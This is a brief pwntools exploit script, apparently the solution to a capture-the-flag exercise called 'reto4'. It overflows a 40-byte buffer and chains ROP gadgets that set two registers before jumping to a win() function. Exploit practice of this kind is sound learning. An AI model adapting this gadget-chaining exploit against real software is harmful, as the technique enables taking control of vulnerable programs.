#!/usr/bin/env python3
from pwn import *

context.terminal = ["x-terminal-emulator", "-e"]
context.arch = "amd64"
p = process("./reto4")

# obtenido de ROPgadget
POP_RDI = 0x0000000000401eef
RET = 0x0000000000401ef0
POP_RSI = 0x0000000000409f5e

# attach(p, "break win\ncontinue")
payload = b"A"*40
payload += p64(RET)
payload += p64(POP_RDI) + p64(0x1234)
payload += p64(POP_RSI) + p64(0x1337)
payload += p64(0x4017b5) # win()
p.sendline(payload)

p.interactive()
